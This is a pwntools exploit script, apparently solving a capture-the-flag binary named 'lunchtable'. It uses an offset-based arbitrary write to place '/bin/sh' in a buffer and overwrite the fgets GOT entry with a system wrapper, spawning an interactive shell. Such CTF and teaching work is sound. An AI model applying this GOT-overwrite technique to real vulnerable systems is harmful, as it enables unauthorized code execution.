from pwn import *

# Replace this with whatever term you use and the "execute" call to run gdb in it
context.terminal = ['konsole', '-e']
context.arch = 'amd64'


p = process('./lunchtable')
gdb.attach(p, '''
break
''')

buffer_addr  = 0x0000006010a0 # -> CHAR[32]
goodbye_addr = 0x0000006010c0 # -> CHAR[16]
system_got_addr = 0x000000601028 # -> addr of fgets@got.plt
fgets_got_addr = 0x0000601038
puts_got_addr = 0x00601018

seip_addr = 0x7fffb37c9648
system_wrapper = 0x00000040085c # -> ptr to system_wrapper
str_addr = 0x00400b1a

# input_yn is a local -> CHAR
# name is a local -> CHAR[8]
# input_offset is a local -> INT
# todo: 
# actually jumps to 0x400967

"""
Here's the exploit:
Write /bin/sh\x00 -> buffer[0:8]
Overwrite *fgets_got_addr with system_rapper
"""

# send our name (this doesn't matter but <8 chars so we don't overfill)
print("got: " + p.recvline())
p.sendline("nova")
print("sent: " + "nova")

# write "/bin/sh" to our buffer
print("got: " + p.recvline())
print("got: " + p.recvline())
p.sendline("/bin/sh\x00")
print("sent: " + "/bin/sh\x00")

# recv until the yes/no prompt
print("got: " + p.recvuntil(": "))
p.sendline("y")
print("sent: " + "y")

# send the address of fgets@got.plt as the place to write to next
print("got: " + p.recvline())
p.sendline(str(fgets_got_addr - buffer_addr))
print("sent: " + str(fgets_got_addr - buffer_addr))

# send the overwrite (which is the addr of the system_wrapper function)
print("got: " + p.recvline())
p.sendline("\x5c\x08\x40\x00\x00\x00\x00\x00")
print("sent: " + str(hex(system_wrapper)))

# loop by saying "yes" to the prompt
print("got: " + p.recvuntil(": "))
p.sendline("y")
print("sent: " + "y")

# this doesn't matter
print("got: " + p.recvline())
p.sendline("0")
print("sent: " + str("0"))

# we now call fgets, which has been overwritten with our system wrapper address.
# fgets got entry has been overwritten with system_wrapper, and the first argument to fgets
# was the address of our buffer. The location contains "/bin/sh" so we are calling system("/bin/sh")!
print("got: " + p.recvline())
p.sendline("/bin/sh\x00")
print("sent: " + "/bin/sh\x00")

p.interactive()
